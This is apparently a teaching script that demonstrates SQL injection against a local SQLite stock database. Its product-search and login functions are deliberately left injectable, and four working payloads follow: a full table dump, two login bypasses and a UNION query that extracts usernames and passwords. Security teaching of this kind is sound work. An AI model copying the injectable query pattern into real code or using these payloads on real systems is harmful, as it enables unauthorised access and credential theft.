import sqlite3
conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    # Vulnerable: directly inserts user input into SQL string
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print("Query:", query)
    rows = conn.execute(query).fetchall()
    print("Result:", rows, "\n")
    return rows

def login(username, password):
    # Vulnerable: directly inserts user input into SQL string
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print("Query:", query)
    row = conn.execute(query).fetchone()
    print("Result:", row, "\n")
    return row

# --- Attacks ---
print("\nAttack 1 - Dump all products")
search_product("' OR 1=1--")

print("\nAttack 2 - Login bypass with no password")
login("admin'--", "anything")

print("\nAttack 3 - Always true login")
login("' OR '1'='1", "' OR '1'='1")

print("\nAttack 4 - UNION attack (steal user data)")
search_product("' UNION SELECT id, username, password, role FROM users--")
